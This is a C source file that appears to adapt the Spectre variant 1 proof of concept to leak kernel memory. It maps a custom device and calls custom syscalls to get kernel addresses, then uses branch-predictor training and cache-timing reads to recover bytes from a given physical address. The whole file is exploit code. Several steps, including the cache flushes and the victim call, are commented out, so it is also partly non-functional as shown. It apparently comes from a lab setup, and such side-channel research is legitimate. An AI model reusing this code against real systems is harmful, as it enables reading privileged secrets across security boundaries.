#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/mman.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt", on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

#define MY_MMAP_LEN (256)
#define PAGE_SIZE 4096

unsigned int array1_size = 16;
uint8_t * array2;
/********************************************************************
 Analysis code
 ********************************************************************/
#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2], size_t malicious_y) {
    static int results[256];
    int tries, i, j, k, mix_i, junk = 0;
    size_t training_x, x;
    register uint64_t time1, time2;
    volatile uint8_t *addr;

    for (i = 0; i < 256; i++)
        results[i] = 0;                  
    for (tries = 999; tries > 0; tries--) {

        /* Flush array2[256*(0..255)] from cache */
        //for (i = 0; i < 256; i++)
        //    _mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction */

        /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
        training_x = tries % array1_size;
        for (j = 29; j >= 0; j--) {
            //_mm_clflush(&array1_size);
            //for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */

            /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
            /* Avoid jumps in case those tip off the branch predictor */
            x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
            x = (x | (x >> 16));         /* Set x=-1 if j&6=0, else x=0 */
            x = training_x ^ (x & (malicious_x ^ training_x));

            /* Call the victim! */
            //victim_function(x);
            //syscall(329, malicious_x, malicious_y);
        }

        /* Time reads. Order is lightly mixed up to prevent stride prediction */
        for (i = 0; i < 256; i++) {
            mix_i = ((i * 167) + 13) & 255;
            addr = &array2[mix_i * 4096];
            time1 = __rdtscp(&junk);         /* READ TIMER */
            junk = *addr;                    /* MEMORY ACCESS TO TIME */
            time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
            if (time2 <= CACHE_HIT_THRESHOLD && mix_i != training_x) //array1[tries % array1_size])
                results[mix_i]++; /* cache hit - add +1 to score for this value */
        }

        /* Locate highest & second-highest results results tallies in j/k */
        j = k = -1;
        for (i = 0; i < 256; i++) {
            if (j < 0 || results[i] >= results[j]) {
                k = j;
                j = i;
            } else if (k < 0 || results[i] >= results[k]) {
                k = i;
            }
        }
        if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
            break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
    }
    results[0] ^= junk; /* use junk so code above won’t get optimized out*/
    value[0] = (uint8_t)j;
    score[0] = results[j];
    value[1] = (uint8_t)k;
    score[1] = results[k];
}



int main(int argc, const char **argv) {
    int i, score[2], len = 40;
    uint8_t value[2];
    size_t kernel_array1, kernel_array2, secret_physical_address, secret_kernel_vir, prob_kernel_vir;
    size_t malicious_x, malicious_y;
    int fd;
    int junk = 0;
    register uint64_t time1, time2;
    fd = open("/dev/expdev", O_RDWR);
    if (fd < 0) {
        perror("Open call failed");
        return -1;
    }
    array2 = mmap( NULL, MY_MMAP_LEN * PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    if (array2 == MAP_FAILED) {
        perror("mmap operation failed");
        return -1;
    }
    //printf("array2 = 0x%lx\n", (unsigned long)array2);
    
    kernel_array1 = syscall(330, 1);
    kernel_array2 = syscall(330, 2);
    sscanf(argv[1], "%lx", &secret_physical_address);
    secret_kernel_vir = syscall(330, secret_physical_address);


    //for (i = 0; i < MY_MMAP_LEN * PAGE_SIZE; i++) array2[i] = 'x'; // write to array2 so in RAM not copy-on-write zero pages
    
    
    malicious_x = secret_kernel_vir - kernel_array1;
    malicious_y = 0xffff8800758e0000 - kernel_array2;

    printf("Reading %d bytes:\n", len);
    
    while (--len >= 0) {
        printf("Reading at malicious_x = %p... ", (void *)malicious_x);
        readMemoryByte(malicious_x++, value, score, malicious_y);
        printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
        printf("0x%02X=’%c’ score=%d ", value[0], (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
        if (score[1] > 0)
            printf("(second best: 0x%02X score=%d)", value[1], score[1]);
	printf("\n");
    }
    
    return(0);
}
